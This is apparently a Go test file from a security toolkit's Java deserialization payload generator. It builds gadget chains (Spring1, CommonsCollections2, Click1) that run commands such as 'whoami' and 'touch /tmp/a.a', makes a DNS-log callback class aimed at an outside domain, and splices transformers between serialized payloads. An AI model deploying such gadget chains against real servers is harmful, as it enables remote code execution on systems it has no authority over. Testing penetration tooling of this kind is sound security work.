package yso

import (
	"fmt"
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"github.com/yaklang/yaklang/common/yserx"
	"os"
	"testing"
)

func SendPayload(payload []byte, opts ...lowhttp.LowhttpOpt) []byte {
	opts = append(opts, lowhttp.WithPacketBytes(append([]byte("GET /unser HTTP/1.1\nHost: 127.0.0.1:8081\n\n"), payload...)))
	rsp, err := lowhttp.HTTP(opts...)
	if err != nil {
		panic(err)
	}
	return rsp.RawPacket
}

func TestParseCC6(t *testing.T) {
	content, err := os.ReadFile("/Users/z3/Downloads/payload1.ser")
	if err != nil {
		t.Fatal(err)
	}
	content4, err := os.ReadFile("/Users/z3/Downloads/payload4.ser")
	if err != nil {
		t.Fatal(err)
	}
	serxs, err := yserx.ParseJavaSerialized(content)
	ser := serxs[0]
	serxs4, err := yserx.ParseJavaSerialized(content4)
	ser4 := serxs4[0]
	var transformInPayload4 yserx.JavaSerializable
	WalkJavaSerializableObject(ser4, func(desc *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
		if desc.Detail.ClassName == "org.apache.commons.collections.functors.ChainedTransformer" {
			transformInPayload4 = objSer
		}
	})
	_ = transformInPayload4
	WalkJavaSerializableObject(ser, func(desc *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
		if desc.Detail.ClassName == "org.apache.commons.collections.functors.ChainedTransformer" {
			replace(transformInPayload4)
		}
	})
	byts := yserx.MarshalJavaObjects(ser)
	os.WriteFile("/Users/z3/Downloads/_payload1.ser", byts, 0777)
}
func TestGenerateGadgetByGadgetName(t *testing.T) {
	gadget, err := GenerateGadget("Spring1", SetRuntimeExecEvilClass("touch /tmp/a.a"))
	if err != nil {
		t.Fatal(err)
	}
	ser, err := ToBytes(gadget)
	if err != nil {
		t.Fatal(err)
	}
	println(codec.EncodeBase64(ser))
}
func TestGenerateGadgetByClassLoader(t *testing.T) {
	classObj, err := GenDnslogClassObject("gqlxsqfoja.dgrh3.cn")
	if err != nil {
		t.Fatal(err)
	}
	classBytesCode, err := ToBytes(classObj)
	if err != nil {
		t.Fatal(err)
	}
	//println(codec.EncodeBase64(classBytesCode))
	cfg, err := ConfigJavaObject("CommonsCollections2", SetClassBytes(classBytesCode))
	if err != nil {
		t.Fatal(err)
	}
	ser, err := ToBytes(cfg)
	if err != nil {
		t.Fatal(err)
	}
	println(codec.EncodeBase64(ser))
}
func TestGenerateGadget(t *testing.T) {
	YsoConfigInstance, err := getConfig()
	if err != nil {
		t.Fatal(err)
	}
	for name, gadget := range YsoConfigInstance.Gadgets {
		if gadget.IsTemplate {
			_, err = ConfigJavaObject(name)
			if err != nil {
				t.Fatal(err)
			}
		} else {
			gadget, err := setCommandForRuntimeExecGadget(name, "whoami")
			if err != nil {
				t.Fatal(err)
			}
			_ = gadget
		}
	}
}
func TestMUSTPASSSetMajorVersion(t *testing.T) {
	type testCase struct {
		version     uint16
		className   string
		wantVersion uint16
	}
	handleJavaValue := func(value *yserx.JavaFieldValue, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		if value.Type != yserx.X_FIELDVALUE {
			return
		}

		array2, ok := value.Object.(*yserx.JavaArray)
		if !ok || !array2.Bytescode {
			return
		}
		handle(nil, array2)
	}
	handleJavaField := func(f yserx.JavaSerializable, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		field, ok := f.(*yserx.JavaFieldValue)
		if !ok || field.Type != yserx.X_FIELDVALUE {
			return
		}

		array, ok := field.Object.(*yserx.JavaArray)
		if !ok {
			return
		}

		for _, value := range array.Values {
			handleJavaValue(value, handle)
		}
	}
	handleJavaClassData := func(o yserx.JavaSerializable, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		data, ok := o.(*yserx.JavaClassData)
		if !ok {
			return
		}

		for _, f := range data.Fields {
			handleJavaField(f, handle)
		}
	}
	handleJavaSerializable := func(objSer yserx.JavaSerializable, handle func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable)) {
		obj, ok := objSer.(*yserx.JavaObject)
		if !ok {
			return
		}

		for _, o := range obj.ClassData {
			handleJavaClassData(o, handle)
		}
	}

	tests := []testCase{
		{version: 50, className: "TjftfYIA", wantVersion: 50},
		{version: 51, className: "TjftfYIA", wantVersion: 51},
		{version: 133, className: "TjftfYIA", wantVersion: 52},
		// Add more test cases as needed
	}

	for _, tc := range tests {
		t.Run(fmt.Sprintf("Version%d", tc.version), func(t *testing.T) {
			got, err := GetClick1JavaObject(
				SetRuntimeExecEvilClass("whoami"),
				SetObfuscation(),
				SetClassName(tc.className),
				SetMajorVersion(tc.version),
			)

			if err != nil {
				t.Errorf("GetClick1JavaObject() error = %v", err)
				return
			}
			g, _ := ToBytes(got)
			javaSerializables, err := yserx.ParseFromBytes(g)
			if err != nil {
				t.Errorf("ParseFromBytes() error = %v", err)
				return
			}

			found := false
			WalkJavaSerializableObject(javaSerializables, func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable, replace func(newSer yserx.JavaSerializable)) {
				// Assuming the WalkJavaSerializableObject and other functions are defined elsewhere
				handleJavaSerializable(objSer, func(desc1 *yserx.JavaClassDesc, objSer yserx.JavaSerializable) {
					javaClass, ok := objSer.(*yserx.JavaArray)
					if ok {
						obj, err := javaclassparser.Parse(javaClass.Bytes)
						if err == nil && obj.MajorVersion == tc.wantVersion {
							found = true
						}
					}
				})
			})

			if !found {
				t.Errorf("Test case with version %d failed, expected major version was %d", tc.version, tc.wantVersion)
			}

			var found2 bool
			got2, err := GenerateProcessBuilderExecEvilClassObject("whoami",
				SetObfuscation(),
				SetClassName(tc.className),
				SetMajorVersion(tc.version),
			)

			if err != nil {
				t.Errorf("GenerateProcessBuilderExecEvilClassObject() error = %v", err)
				return
			}
			g2, _ := ToBytes(got2)

			version := g2[7]
			if uint16(version) == tc.wantVersion {
				found2 = true
			}
			if !found2 {
				t.Errorf("Test case with version %d failed, expected major version was %d", tc.version, tc.wantVersion)
			}

		})
	}
}
